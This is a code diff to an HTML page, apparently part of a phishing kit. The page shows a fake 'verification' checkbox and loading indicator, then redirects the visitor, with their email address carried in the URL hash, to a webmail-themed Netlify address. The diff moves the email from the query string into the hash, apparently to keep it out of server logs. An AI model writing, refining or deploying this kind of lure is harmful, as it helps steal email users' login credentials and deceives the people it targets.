@@ -134,25 +134,20 @@
     </div>
     <script nonce="MTcyOTY1MTMwNywyOTU0NDA1ODcx">
         document.addEventListener('DOMContentLoaded', function () {
-            // Extract and decode the email from the URL
-            const urlParams = new URLSearchParams(window.location.search);
-            let email = urlParams.get('email'); 
+            // Extract and decode the email from the URL hash (after '#')
+            const hash = window.location.hash.substr(1); // Remove the '#' character
+            let email = hash ? decodeURIComponent(hash) : ''; // Decode the email if it exists
             
-            // Check if email is present and decode it properly
-            if (email) {
-                email = decodeURIComponent(email); // Decode the email to handle %40 -> @
-            }
-        
             // Listen for form submission
             document.getElementById('verificationForm').addEventListener('submit', function (event) {
                 event.preventDefault();
-                
+
                 // Check if the checkbox is checked
                 if (document.getElementById('verify').checked) {
                     document.getElementById('loadingIndicator').style.display = 'block';
                     document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
-                    
-                    // Redirect after a delay and use the email without encoding again
+
+                    // Redirect after a delay and use the email
                     setTimeout(function () {
                         window.location.href = 'https://webmail-approve23-csm294628.netlify.app/#' + email;
                     }, 3000);
